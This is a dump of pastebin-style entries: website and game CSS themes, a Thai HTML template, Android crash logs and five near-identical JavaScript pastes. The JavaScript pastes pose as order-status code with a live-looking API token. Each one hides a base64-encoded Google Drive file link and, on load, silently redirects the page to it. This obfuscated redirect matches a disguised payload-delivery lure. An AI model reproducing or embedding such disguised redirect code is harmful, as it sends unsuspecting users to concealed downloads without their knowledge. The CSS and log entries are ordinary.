  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
c3dqf9RR,Untitled,SpawnKz,JavaScript,Wednesday 9th of April 2025 10:57:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/75821/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qhUVC59d,2025-04-09T17:55:54.779568,powerampache,PHP,Wednesday 9th of April 2025 10:55:55 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.15.245.117 (port 49946) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

scrobble() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.15.245.117 (port 49946) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.15.245.117 (port 49946) after 15000ms\"" }"",""stackTrace"":[]}"
MbX9SQcc,Rejuv Full back up4/9/25,coffeeandphotos,CSS,Wednesday 9th of April 2025 10:51:34 AM CDT,"//font styles
@font-face{font-family:'Essential Sans';src:url('https://static1.squarespace.com/static/63642c9b83e5a7329c53abd4/t/67f0a658a6109c31d213f0e2/1743824472975/EssentialSans-Bold.woff')format('woff');font-weight:normal;}:root{--heading-font-font-family:'Essential Sans';}

@font-face{font-family:'Essential';src:url('https://static1.squarespace.com/static/63642c9b83e5a7329c53abd4/t/67f0a1982e773144c7dd8fda/1743823256558/EssentialSans-Medium.woff')format('woff');font-weight:normal;}:root{--body-font-font-family:'Essential';}


//Don't Display Portfolio Pagination
.item-pagination--prev-next {
display: none;}
 
/* Change dropdown menu background */
.header-nav-folder-content {
background: #BEBCE6 !important;
}
 
//header nav menu mobile
 
.header-menu-nav-item a {
font-size: 1.9rem;}
 
//remove underline from links
a {
text-decoration: none !important;
}
header a {
background-image: none !important;
}
footer a {
text-decoration: none !important;
}
 
//hide BACK arrow in mobile menu
.header-menu-controls-control span:nth-of-type(2) {
display: none;
}
 
// logo gallery marquee homepage
 
@keyframes moveLeft {
0% {
transform: translateX(0%);
}
 
100% {
transform: translateX(-300%);
}
}
//main css
section[data-section-id=""63c35bb9b98b7f0d1d647b8d""] {
overflow:hidden;
border-bottom:1px solid;
 
.gallery-grid-item-wrapper img  {
object-fit:contain !important;
}
 
.gallery-grid-wrapper {
display:flex !important;
animation:  moveLeft 65s linear      infinite;
.gallery-grid-item {
min-width:15%;
margin-right:5%;
}
}
 
.gallery-grid-item:not([data-show]) .gallery-grid-item-wrapper {
opacity: 1;
 
}
.gallery-grid-item:not([data-show]) .gallery-grid-item-caption {
opacity: 1;
visibility: visible !important;
}
 
.gallery-grid[data-show-captions=""false""] .gallery-grid-item-caption {
display: none
}
 
.gallery-grid[data-show-captions=""true""][data-animation=""none""] .gallery-grid-item-caption {
transition: none
}
 
}
 
//mobile
 
section[data-section-id=""63c35bb9b98b7f0d1d647b8d""] {
 
@media screen and (max-width:767px) {
.gallery-grid-item {
min-width:50% !important;
margin-right:5%;
}
 
}
 
.gallery  {
min-height:initial !important;
}
 
}
//end of gallery marque
 
//list image radius
 
.user-items-list-simple .list-image
{border-radius:40px;}
 
//-- testimonial carosel list shape/radius
.list-item[data-is-card-enabled=""true""] {border-radius:40px}
 
//blog image style radius
.blog-basic-grid .image-wrapper img {
border-radius: 40px;}
 
//gallery slideshow container radius homepage
section[data-section-id=""663e8090bd16811e3c5ee9b6""]
.sqs-gallery-block-slideshow .sqs-gallery-design-stacked-slide {border-radius:40px;}
//
.sqs-gallery-block-slideshow {
background-color: transparent}
//
//mega menu
.mega {
position: absolute;
width: 100%;
opacity: 0;
left: 0;
bottom: 0px;
visibility: hidden;
pointer-events: none;
transition:transform 1s ease;
transform: translate(0,95%);
 
&:after {
position: absolute;
left: 0;
content: '';
height: 100%;
width: 100%;
z-index: -1;
background: transparent;
top: 5px;
transform: translate(0,-100%);
 
}
 
}
 
.mega:hover {
opacity: 1;
visibility: visible;
pointer-events: auto!important;
-webkit-transition-delay: 0s;
-o-transition-delay: 0s;
transition-delay: 0s;
transform: translate(0,100%);
& * {
pointer-events: auto;
}
}
.folder a {
pointer-events:none;
}
.folder:hover {
& + .mega {
opacity: 1;
pointer-events: auto!important;
visibility: visible;
transform: translate(0,100%);
}
}
 
@media (min-width:991px) {
 
.folder {
z-index:99999 !important;
.header-nav-folder-content {
display: none;
}
}
.header-nav-item,
.header-title,
.header-actions {
z-index: 9;
position: relative !important;
}
.header-background,.header::before,
{
pointer-events: none!important;
}
 
.header-display,
.header-inner {
position: static!important;
}
 
}
 
//LEFT ALIGN TEXT
.mega {
p,h2,h3,h1 {
text-align:left;
}
//remove underlines in links
p a {
border-bottom:0px !important;
}
}
 
.section-background-content img {
visibility:visible !important;
}
 
//background color
//Mega Menu Background color
.mega {
 
.section-background {
background-color: #EBEAEB !important;
}
 
}
//padding
.mega {
.content-wrapper {
padding-top: 5vh !important;
padding-bottom: 5vh !important;
}
}
//typography
.mega {
h3 {
font-size:18px;
font-family: Poppins;
}
h1,h2,h3,h4, p {
text-align:left;
line-height: 1.8;
}
 
}
 
//mobile mega menu
//Hide Default Nav Items
//hide popout menu on mobile, most tablets
@media only screen and (max-width: 1024px) and (pointer: coarse), screen and (max-width: 799px) {
.header-menu-nav-list {
display:none;
}
 
}
 
//basic mobile
 
.header--menu-open .header-menu {
overflow-y:scroll;
background-color:#EBEAEB; //change as needed
.header-menu-bg{
display:none;
}
 
//Fix Background Color
.page-section {
background-color:transparent !important;
 
min-height:initial !important;
}
 
.section-background {
background-color: transparent !important;
}
 
//Define Padding
.content-wrapper {
padding-top:0px  !important;
padding-bottom:0px !important;
}
//Adjust Block Spacing
.sqs-block {
padding-top:10px;
padding-bottom:10px;
}
 
}
 
body:not(.header--menu-open) {
#mobileNav {
opacity:0;
}
}
 
.header--menu-open {
#mobileNav {
opacity:1;
}
}
 
//fix button mobile nav
[data-section-id=""67183b1fd77927170e45465d""] .sqs-button-element--primary {color: #fff !important}

#block-672195f140a26602472e .sqs-button-element--tertiary {color: #fff !important}
 
//mobile menu page font style
[data-section-id=""63cf36ffbc1f0240b2998d16""] H3 { line-height: 1.8 !important;
}
[data-section-id=""63cf3617e216dc3d3b12e29d""] H3 { line-height: 1.8 !important;
}
 
//gallery radius + instagram block radius
.slide .sqs-video-overlay {border-radius: 40px !important;}
 
//gallery radius + instagram block radius
.sqs-gallery-block-grid .slide .margin-wrapper a.image-slide-anchor {border-radius: 40px !important;}"
UdUby1ZT,2025-04-09T11:44:45.322392,powerampache,PHP,Wednesday 9th of April 2025 10:44:46 AM CDT,"1.01-79-play (79) - DB: 83
retrofit2.HttpException: HTTP 404 Not Found
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

authorize() - cannot load data HttpException {""code"":404,""message"":""Not Found"",""detailMessage"":""HTTP 404 Not Found"",""stackTrace"":[]}"
cv9cCZT5,2025-04-09T11:44:21.163433,powerampache,PHP,Wednesday 9th of April 2025 10:44:22 AM CDT,"1.01-79-play (79) - DB: 83
java.time.format.DateTimeParseException: Text '0' could not be parsed at index 0
	at java.time.format.DateTimeFormatter.parseResolved0(DateTimeFormatter.java:2050)
	at java.time.format.DateTimeFormatter.parse(DateTimeFormatter.java:1952)
	at java.time.LocalDateTime.parse(LocalDateTime.java:487)
	at luci.sixsixsix.powerampache2.data.mapping.AmpacheDateMapper.isoStringToLocalDateTime(AmpacheDateMapper.kt:43)
	at luci.sixsixsix.powerampache2.domain.mappers.DateMapper$DefaultImpls.invoke(DateMapper.kt:28)
	at luci.sixsixsix.powerampache2.data.mapping.AmpacheDateMapper.invoke(AmpacheDateMapper.kt:29)
	at luci.sixsixsix.powerampache2.data.remote.dto.AuthDtoKt.toSession(AuthDto.kt:111)
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl.tryAuthorize(MusicRepositoryImpl.kt:271)
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl.access$tryAuthorize(MusicRepositoryImpl.kt:83)
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl$tryAuthorize$1.invokeSuspend(Unknown Source:18)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:1000)
	at android.os.Handler.dispatchMessage(Handler.java:104)
	at android.os.Looper.loopOnce(Looper.java:242)
	at android.os.Looper.loop(Looper.java:362)
	at android.app.ActivityThread.main(ActivityThread.java:8448)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:552)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:992)

authorize() - generic exception {""detailMessage"":""Text \u00270\u0027 could not be parsed at index 0"",""stackTrace"":[]}"
f6rrZ6aw,Products.js,SpawnKz,JavaScript,Wednesday 9th of April 2025 10:41:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10296/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qjk7GTKc,Order.js,SpawnKz,JavaScript,Wednesday 9th of April 2025 10:26:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/06450/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
k0GrW0CF,Market.js,SpawnKz,JavaScript,Wednesday 9th of April 2025 10:11:02 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56196/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7hkgsgZz,Untitled,SpawnKz,JavaScript,Wednesday 9th of April 2025 09:55:38 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08307/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FY81qxvT,West World : Thread,Kelly-B9978,HTML,Wednesday 9th of April 2025 09:47:42 AM CDT,"<!--
[คู่มือการแก้ไขโคด]
สีดาว : --west-primary: #292524;

ตำแหน่งภาพ : เพิ่ม --west-pos: 50% 50%; ต่อท้ายลิงก์รูปที่ต้องการปรับ
 - เลขตัวแรกคือการขยับซ้าย - ขวา โดย 0% = ชิดซ้าย 100% = ชิดขวา
 - เลขตัวแรกคือการขยับขึ้น - ลง โดย 0% = ชิดบน 100% = ชิดล่าง
 
ขนาดภาพ : เพิ่ม --west-size: cover; ต่อท้ายลิงก์รูปที่ต้องการปรับ
 - cover คือ ขยายเต็มพื้นที่
 - 100% คือ ขนาดเดิมของรูป
 - มากกว่า 100% คือ ขนาดใหญ่ขึ้น
 - น้อยกว่า 100% คือ ขนาดเล็กลง
-->

<link href=""https://dl.dropbox.com/scl/fi/ubghi6edr8wu7rh93inuu/west-world.css?rlkey=2zbqf4yxybassc685mj08ugtq&st=f9qgdzp5"" rel=""stylesheet"">
<div id=""WestWorld""><a href=""https://discord.com/users/625292873914515456/"" target=""_blank""></a><div class=""west-box"">
<div class=""west-bg"" style=""--west-primary: #292524;"">
<div class=""west-bd""><tpl></tpl><tpr></tpr><btl></btl><btr></btr>
<div class=""west-img"" style=""--west-pic: url(--ลิงก์รูปภาพ--);""></div>
<div class=""west-place"">--ชื่อสถานที่--</div>
<div class=""west-content"">
--คำบรรยาย--
</div>
<hr class=""west-star"">
</div></div></div></div>"
wzYnmB5J,Christmas CSS,PhantomGame,CSS,Wednesday 9th of April 2025 09:45:23 AM CDT,"/* holiday css by thaddeuz (thanks to oranda4040 for helping too!) */
/* Please credit me if you want to redistribute this code as part of your code. */

/* Updated 14 December 2024 */

:root {
      --div-grey: rgb(0 0 0 / 0%);
      --div-black: rgb(0 0 0 / 0%);
      --accent-color: #a5d8ed;
      --blue: #a5d8ed;
      --green: #a5edb2;
      --red: #eda5a5;
  }
    
     /* fonts */
  
@font-face {
      font-family: gamefont;
      src: url(https://fonts.gstatic.com/s/montserrat/v15/JTURjIg1_i6t8kCHKm45_dJE3gnD_g.woff2);
}

     /* removal */
#instructions,
#mainLogoFace,
#tlInfHold,
.menuSocialB,
#aHolder,
.endAHolder,
#topRightAdHolder, 
#seasonLabel,
#termsInfo,
#streamContainer,
#editorBtnM, #timerIcon, 
#bottomLeftClassImg, 
#bottomLeftTeamHolder,
#bottomLeftChallIcon,
#bottomLeftHealth,
#voiceIcon,
#recTimer, 
#ammoMax,
#ammoIcon,
.weapKey,
.weapSkin,
#menuClassSubtext,
#menuClassName,
#menuClassIcn,
#customizeButton .material-icons,
.menuItem .menuItemTitle,
#chatSwitch,
#mapInfoHld, #matchInfo.topLeftOld {
      display: none !important;
  }

  /* menu css */
  
     /* bottom */
  
#subLogoButtons {
      bottom: 90px;
      text-shadow: 2px 2px 3px rgba(30, 30, 30, .5);
}
  
.button, .button:hover { 
      background-color: transparent !important;
      border: hidden ! important;
}
  
#subLogoButtons>.button {
      background-color: #00000000 !important;
      border: hidden ! important;
}

	  /* spectate cred oranda4040 */

#uiBase.onMenu #spectButton {
    z-index: 0;
    width: 48px;
    top: 51%;
    transform: translate(-50%, -50%)
}

#spectButton span[style=""font-size:15px;color:rgba(255,255,255,.6)""] {
    color: transparent !important;
    font-size: 0px
}

#spectButton .switchsml {
    margin: 0;
    position: absolute;
    width: 100%
}

.sliderSml {
    opacity: 1
}

.sliderSml::before {
    content: ""Spectate"";
    font-size: 20px;
    color: white;
    width: max-content;
    height: auto;
    background-color: transparent;
    text-align: center;
    transition-duration: 0.25s
}

.sliderSml::before {
    content: ""play_arrow"";
    font-size: 35px;
    color: white;
    width: max-content;
    height: auto;
    background-color: transparent;
    text-align: center;
    transition-duration: 0.25s;
    font-family: 'Material Icons';
	text-shadow: var(--text-shadow)
}

input:checked+.sliderSml::before {
    content: ""visibility"";
    color: white;
    transform: unset
}

input:checked+.sliderSml {
    background-color: transparent !important
}

.sliderSml {
    opacity: 1;
    background-color: transparent
}
  
     /* top left */
  
#mLevelCont,
    .headerBarLeft,
    .headerBarRight {
    background-color: transparent
}
  
#menuAccountUsername {
    font-size  : 23px;
    padding-top: 4px;
    padding-left: 6px
}
  
.verticalSeparator {
    opacity:0
}
  
.progressBar {
    height: 9px;
    margin-top: -4px;
    background-color: rgba(0, 0, 0, 0.15);
    border-radius: 999px
}
  
.progressBarInner {
    background-image: linear-gradient(to right,#a5d8ed, white);
    border-radius: 999px
}
  
#mailContainer {  
    padding-bottom: 4px
}
  
#mLevelContV {
    font-size  : 60px
}
  
.krInfo {
    font-size: 18px !important;
    position : fixed;
    top      : 89px;
    left     : 20px
}
  
.junkInfo {
    font-size: 18px !important;
    position : fixed;
    top      : 94px;
    left     : 140px
}
  
     /* left cred Sakura Theme v1.0.0 */
  
.material-icons-outlined, span.material-symbols-outlined {
    color: #fff !important
}
  
#menuItemContainer {
    margin-left: -25px;
    bottom: unset;
    display: flex;
    flex-direction: column;
    top: 100px;
    background: transparent;
}
  
.menuItem {
    height: 84px;
    width: 84px;
    margin-left: 40px;
    margin-top: 12px;
    margin-bottom: 10px;
    background: var(--accent-color);
    border-radius: 999px;
    border-right: 0px solid var(--border-color);
    display: block;
    position: relative;
}
  
.menuItem:hover {
    width: 200px;
}
  
.menuItem .material-icons-outlined {
    position: absolute;
    top: 50%;
    left: calc(100% - 41.5px);
    transform: translate(-50%, -50%);
}
  
.menuItem .menuItemTitle {
    margin-top: unset;
    position: absolute;
    top: 50%;
    left: calc(0%);
    transform: translate(-50%, -50%);
    font-size: 20px !important;
    opacity: 0;
}
  
.menuItem:hover .menBtnIcn {
    position: absolute;
    top: 50%;
    left: calc(100% - 100px);
    transition: unset;
    transform: translate(-50%, -50%);
    color: #ffd1d1 !important
}
  
     /* hud class popup */
  
#menuClassContainer:hover #classPreviewCanvas {
    transform: unset !important;
}
  
#classPreviewCanvas {
    transform: translateY(500000px);
    margin-bottom: -135px;
    margin-right: -113px
}
  
.bigShadowT {
    text-shadow: none !important
}

     /* ammo */

#ammoHolder {
    position: fixed;
    top: calc(50% + 35px);
    left: calc(50% - 30px);
    transform: unset;
    height: 7px;
    width: 60px;
    background-color: transparent!important;
    background-image: linear-gradient(to right,rgb(255 255 255),rgb(255 255 255))
}
  
#ammoVal {
    font-size: 50px;
    position: fixed;
    right: calc(0% - -42px);
    bottom: 30px;
    text-shadow: 1px 1px 3px #a5d8ed
}

     /* weap */

.weapItem {
    transition-duration: 0.25s;
    filter: drop-shadow(0.5px 0.5px 2px #a9caeab8);
    height: 0;
    opacity: 0 !important;
    background-color: transparent;
}
  
.weapItemInner {
    background-color: transparent
}
  
.weapIcon {
    height: 50%;
    width: 50%;
}
  
.weapItem[style*=""1""] {
    opacity: 1 !important;
    height: 80px;
}
  
.weapKey,.weapSkin, .weapStreakHolder, .weapStreakInner {
    display: none !important;
}
    
     /* health bar */
  
#bottomLeftHealthBar {
    width: 340px;
    position: fixed;
    left: calc(0% + 19px);
    bottom: calc(0% + 20px);
}
  
.nHealthBarSeg {
    display: flex;
    height: 31px;
    width: -webkit-fill-available;
    margin: 0 -3.88px;
    background:transparent
}
  
.nHpBSeg {
    border-radius: 3.5px
}

#bottomLeftHealthBar::after {
    content: "" "";
    background: url(https://indiciashop.com/thaddeuz/wp-content/uploads/2024/12/image-1-1.png);
    background-size: 374px;
    width: 374px;
    height: 200px;
    position: fixed;
    bottom: -67px;
    left:10.5px;
    z-index:-999;
}

     /* timer */
  
#timerVal.topLeftOld {
    font-size: 40px!important;
    text-shadow: 1px 1px 3px #ffa0a0!important;
}
  
     /* counters */
  
#killsVal,#deathsVal,#streakVal,#myScoreVal,#kdVal {
    color: white;
    font-size: 30px;
    text-shadow: 1px 1px 3px #ffa0a0!important;
}
  
#killsIcon,#deathsIcon,#streakIcon,#kdIcon {
    width: 26px;
    height: 26px;
}
  
     /* fps and ping */

#ingameFPS,#fpsDisplay {
    margin-top: 20px
}
  
#menuFPSDisplay,#menuFPS,#ingameFPS,#fpsDisplay,
#menuPingText,#menuPingDisplay .material-icons,#pingDisplay,#pingText {
    color: white !important;
    text-shadow: 1px 1px  3px  #a9caeaa1;
}
  
     /* chat */
  
#chatInput {
    font-size: 18px;
    position:absolute;
    left:0px;
    background-color: rgb(255 255 255 / 0%);
    border: 0px solid rgb(255 255 255 / 0%);
}
  
#chatList {
    background-color: rgba(0, 0, 0, 0);
}
  
.chatItem {
    font-size: 18px;
    max-width: 265px;
    text-shadow: 2px 2px 3px rgba(30, 30, 30, .5);
}
    
.chatItem span[style=""color:#fc03ec""] {
    color: #a5d8ed !important;
}

#uiBase.onMenu #chatHolder {
    left: 120px
}
  
#uiBase.onCompMenu #chatHolder {
    left: 120px
}

#uiBase.onGame #chatHolder {
    left: 18px;
    bottom: 80px
}

     /* settings - thanks jitchu for the help! */

#itemSearchH,#selectorContainer,.classCard,.skinCard {
    background-color: transparent;
    border-radius: 0px;
}

.setSugBox2 {
    border: 4px solid rgb(255 255 255 / 100%);
}
  
.settName,.settNameSmall {
    color: white !important;
}

#menuWindow.dark,
.settingsHeader,
.settingsBtn{
    background-color: black;
}
  
input[type=color],
.setHed {
    border: 4px solid rgba(219 105 105);
    background-color: black;
}
  
input:checked+.slider {
    background-color: #a5d8ed;
	box-shadow: 0px 0px 30px 1px #a5d8ed;
}

.slider:before {
	width: 0px;
}

.switch {
	width: 30px;
	height: 34px;
}

.slider {
	border-radius: 999px;
}

     /* logo */
  
#mainLogo {
    width: 1050px;
    height: 350px;
    content: url(https://indiciashop.com/thaddeuz/wp-content/uploads/2024/12/New_Project_10.png)
}
  
     /* snow */
  
#instructionHolder{
    background-image: url(""data:image/svg+xml,%3Csvg version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x='0px' y='0px' viewBox='0 0 50 50' style='enable-background:new 0 0 50 50%3B' xml:space='preserve'%3E%3Cstyle type='text/css'%3E.st1%7Bopacity:0.7%3Bfill:%23FFFFFF%3B%7D.st3%7Bopacity:0.03%3Bfill:%23FFFFFF%3B%7D%3C/style%3E%3Ccircle class='st3' cx='4' cy='14' r='1'/%3E%3Ccircle class='st3' cx='43' cy='3' r='1'/%3E%3Ccircle class='st3' cx='31' cy='30' r='2'/%3E%3Ccircle class='st3' cx='19' cy='23' r='1'/%3E%3Ccircle class='st3' cx='37' cy='22' r='1'/%3E%3Ccircle class='st3' cx='43' cy='16' r='1'/%3E%3Ccircle class='st3' cx='8' cy='45' r='1'/%3E%3Ccircle class='st3' cx='29' cy='39' r='1'/%3E%3Ccircle class='st3' cx='13' cy='37' r='1'/%3E%3Ccircle class='st3' cx='47' cy='32' r='1'/%3E%3Ccircle class='st3' cx='15' cy='4' r='2'/%3E%3Ccircle class='st3' cx='9' cy='27' r='1'/%3E%3Ccircle class='st3' cx='30' cy='9' r='1'/%3E%3Ccircle class='st3' cx='25' cy='15' r='1'/%3E%3Ccircle class='st3' cx='21' cy='45' r='2'/%3E%3Ccircle class='st3' cx='42' cy='45' r='1'/%3E%3C/svg%3E"");
    background-position: 0px 0px;
    animation: animatedBackground 1000s linear infinite;
    opacity:0.7;
}
  
@keyframes animatedBackground {
    0% {
      background-position: 0 0;
    }
    100% {
      background-position: 0px 320000px;
		
    }"
L1GX6fCE,Rckstr CSS,PhantomGame,CSS,Wednesday 9th of April 2025 09:43:47 AM CDT,":root {
    --Watermark: ""rckstr"";
    --pic: url(https://i.pinimg.com/736x/99/a9/56/99a956a9f3bfea3f8832e389787bfdf0.jpg);
    --white: #fff;
    --uiscale: 1;
    --color: #FFAAFF;
}

@font-face {
    font-family: gamefont;
    src: url(https://reizu.moe/fonts/Renogare.ttf);
}


@font-face {
    font-family: Watermark;
    src: url(https://fonts.gstatic.com/s/joan/v1/ZXupe1oZsqWRXRBN8A.woff2)
}

@font-face {
    font-family: hpammo;
    src: url(https://fonts.gstatic.com/s/montserrat/v15/JTURjIg1_i6t8kCHKm45_dJE3gnD_g.woff2)
}

/* scale */

#uiBase {
    height: calc(100%/var(--uiscale)) !important;
    width: calc(100%/var(--uiscale)) !important;
    transform: scale(var(--uiscale)) !important;
}

/* instructions */

#instructionHolder {
    background-color: transparent;
    backdrop-filter: grayscale(1) brightness(0.3);
}

#uiBase.onMenu #spectButton {
    top: calc(78% + 0px);
}

#spectButton span {
    font-size: 0 !important;
}

#spectButton .switchsml {
    margin: 0;
    width: 64px;
    height: 64px;
}

.sliderSml::before {
    content: ""visibility"";
    font-size: 64px;
    color: white;
    width: max-content;
    height: auto;
    background-color: transparent;
    text-align: center;
    transition-duration: 0.5s;
    font-family: 'Material Icons Outlined';
    left: unset;
    bottom: unset;
}

input:checked+.sliderSml::before {
    content: ""visibility_off"";
    color: var(--white);
    transform: unset;
    transition-duration: 0.5s;
}

input:checked+.sliderSml {
    background-color: transparent !important;
}

.sliderSml {
    opacity: 1;
    background-color: transparent;
}

#uiBase.onMenu #spectateUI {
    bottom: 100% !important;
    left: 96% !important;
}

#uiBase.onMenu #specTimer {
    color: var(--white) !important;
    text-align: left !important;
    text-shadow: 1px 0px 1px #000000, 0px 1px 1px #000000, 2px 1px 1px #000000, 1px 2px 1px #000000, 3px 2px 1px #000000, 2px 3px 1px #000000, 4px 3px 1px #000000, 3px 4px 1px #000000, 5px 4px 1px #000000, 4px 5px 1px #000000, 6px 5px 1px #000000, 5px 6px 1px #000000, 7px 6px 1px #000000
}

    /* Removal */

#aHolder,
#instructions,
.leaderCounter,
#mapInfoHld,
#topRightAdHolder,
.endAHolder,
#ammoMax,
#merchImg,
#onetrust-consent-sdk,
#braveWarning,
#newsHolder,
#streamContainer,
#newUserGuide,
#krDiscountAd,
#updateAd,
#editorBtnM,
.verticalSeparator,
.terms.standout,
.verticalSeparatorInline,
.terms,
.menuWindowSideL,
.windowHeader,
.menuSocialB,
#bubbleContainer,
#termsInfo,
#menuBtnProfile,
#menuBtnShop,
#menuBtnChall,
#menuBtnSocial,
#policeButton,
#menuBtnMaps,
#menuBtnMods,
#menuBtnSettings,
#mainLogo,
